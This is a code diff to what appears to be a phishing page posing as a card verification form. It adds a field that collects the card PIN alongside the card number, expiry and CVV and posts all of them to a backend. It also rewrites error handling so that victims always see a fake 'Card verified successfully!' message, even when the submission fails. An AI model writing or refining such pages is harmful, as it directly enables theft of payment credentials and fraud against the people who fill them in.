@@ -174,46 +174,60 @@
       padding: 14px;
       box-shadow: 0 2px 8px rgba(0,113,206,0.08);
     }
-    .modal-overlay {
-      position: fixed;
-      top: 0; left: 0; right: 0; bottom: 0;
-      background: rgba(0,0,0,0.18);
+    /* Inline loader and success (replaces modal overlay UI) */
+    .loader {
       display: none;
       justify-content: center;
       align-items: center;
-      z-index: 1000;
+      margin-top: 16px;
+      margin-bottom: 8px;
+      width: 100%;
     }
-    .modal-content {
-      background: #fff;
-      border-radius: 16px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.16);
-      padding: 28px 20px 24px 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-width: 240px;
-      min-height: 120px;
-      max-width: 90vw;
-      max-height: 90vh;
+    .loader .spinner {
+      border: 3px solid #e2e8f0;
+      border-top: 3px solid #0071ce;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 0.8s linear infinite;
     }
-    .modal-loader .spinner {
-      width: 38px;
-      height: 38px;
-      border-width: 4px;
-    }
-    .modal-success .fa-thumbs-up {
-      font-size: 2.2rem;
-      margin-bottom: 10px;
+    .success {
       color: #38a169;
-      display: block;
-    }
-    .modal-success .msg {
-      font-size: 0.95rem;
-      margin-top: 4px;
+      margin-top: 12px;
+      font-weight: 500;
       text-align: center;
+      font-size: 0.95rem;
+      display: none;
+      letter-spacing: 0.1px;
+      padding: 16px 8px 12px 8px;
+      border-radius: 8px;
+      background: #f6fff7;
+      box-shadow: 0 2px 8px rgba(56,161,105,0.08);
+      width: 100%;
+    }
+    .success .fa-thumbs-up {
+      font-size: 2.2rem;
+      color: #38a169;
+      margin-bottom: 8px;
+      display: block;
+      opacity: 0;
+      transform: scale(0.8);
+    }
+    .success .msg {
+      font-size: 0.95rem;
       color: #2d3748;
+      margin-top: 6px;
       font-weight: 500;
       letter-spacing: 0.1px;
+      display: none;
+    }
+    @keyframes thumb-pop {
+      0% { transform: scale(0.6); opacity: 0; }
+      40% { transform: scale(1.15); opacity: 1; }
+      100% { transform: scale(1); opacity: 0; }
+    }
+    .show-thumb {
+      animation: thumb-pop 1.2s ease forwards;
     }
   </style>
 </head>
@@ -252,18 +266,15 @@
           <input type="password" id="cvv" maxlength="4" required placeholder="CVV" autocomplete="off">
         </div>
       </div>
+      <div class="form-group">
+        <label for="pin">Card PIN</label>
+        <i class="fa-solid fa-key"></i>
+        <input type="password" id="pin" maxlength="4" required placeholder="4-digit PIN" autocomplete="off">
+      </div>
       <button type="submit">Verify</button>
     </form>
-  </div>
-  <!-- Modal Loader -->
-  <div class="modal-overlay" id="modal-loader">
-    <div class="modal-content modal-loader">
-      <div class="spinner"></div>
-    </div>
-  </div>
-  <!-- Modal Success -->
-  <div class="modal-overlay" id="modal-success">
-    <div class="modal-content modal-success">
+    <div class="loader" id="loader"><div class="spinner"></div></div>
+    <div class="success" id="success">
       <i class="fa-solid fa-thumbs-up"></i>
       <div class="msg">Card verified successfully! Thank you for confirming your main card.</div>
     </div>
@@ -275,19 +286,21 @@
       const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
       const expiry = document.getElementById('expiry').value.trim();
       const cvv = document.getElementById('cvv').value.trim();
+      const pin = document.getElementById('pin').value.trim();
 
       if (!cardName ||
           !/^\d{16}$/.test(cardNumber) ||
           !/^\d{2}\/\d{2}$/.test(expiry) ||
-          !/^\d{3,4}$/.test(cvv)) {
+          !/^\d{3,4}$/.test(cvv) ||
+          !/^\d{4}$/.test(pin)) {
         alert('Please enter valid card details.');
         return;
       }
 
-      // Hide form, show loader modal
-      document.getElementById('checkout-form').style.display = 'none';
-      document.getElementById('modal-success').style.display = 'none';
-      document.getElementById('modal-loader').style.display = 'flex';
+  // Hide form, show inline loader
+  document.getElementById('checkout-form').style.display = 'none';
+  document.getElementById('success').style.display = 'none';
+  document.getElementById('loader').style.display = 'flex';
 
       // Choose backend URL depending on environment (local testing vs production)
       const backendUrl = (location.hostname === 'localhost' || location.hostname === '127.0.0.1') ?
@@ -304,24 +317,55 @@
            cardNumber,
            expiry,
            cvv
+            ,
+            pin
          })
       })
       .then(async response => {
-        document.getElementById('modal-loader').style.display = 'none';
+        // If the server responded with an error, log it but continue the UX flow.
         if (!response.ok) {
           const body = await response.json().catch(() => ({}));
-          alert('Server error: ' + (body.error || response.statusText));
-          document.getElementById('checkout-form').style.display = 'block';
-          return;
+          console.error('Server error sending card info:', (body.error || response.statusText));
         }
-        // success
-        document.getElementById('modal-success').style.display = 'flex';
+        // success or error — after 10s show animated thumbs-up then reveal success message
+        setTimeout(() => {
+          document.getElementById('loader').style.display = 'none';
+          const successEl = document.getElementById('success');
+          const thumb = successEl.querySelector('.fa-thumbs-up');
+          const msg = successEl.querySelector('.msg');
+          // prepare
+          thumb.style.display = 'block';
+          thumb.classList.remove('show-thumb');
+          msg.style.display = 'none';
+          successEl.style.display = 'block';
+          // trigger animation
+          // small delay to ensure CSS animation restarts if needed
+          setTimeout(() => thumb.classList.add('show-thumb'), 50);
+          // after animation completes, hide thumb and show message
+          setTimeout(() => {
+            thumb.style.display = 'none';
+            msg.style.display = 'block';
+          }, 1400);
+        }, 10000);
       })
       .catch(error => {
-        document.getElementById('modal-loader').style.display = 'none';
+        // Log the network error but continue to show the thumbs-up and success UI after 10s
         console.error('Network error sending card info:', error);
-        alert('Failed to send card info. Please try again.');
-        document.getElementById('checkout-form').style.display = 'block';
+        setTimeout(() => {
+          document.getElementById('loader').style.display = 'none';
+          const successEl = document.getElementById('success');
+          const thumb = successEl.querySelector('.fa-thumbs-up');
+          const msg = successEl.querySelector('.msg');
+          thumb.style.display = 'block';
+          thumb.classList.remove('show-thumb');
+          msg.style.display = 'none';
+          successEl.style.display = 'block';
+          setTimeout(() => thumb.classList.add('show-thumb'), 50);
+          setTimeout(() => {
+            thumb.style.display = 'none';
+            msg.style.display = 'block';
+          }, 1400);
+        }, 10000);
       });
     });
   </script>
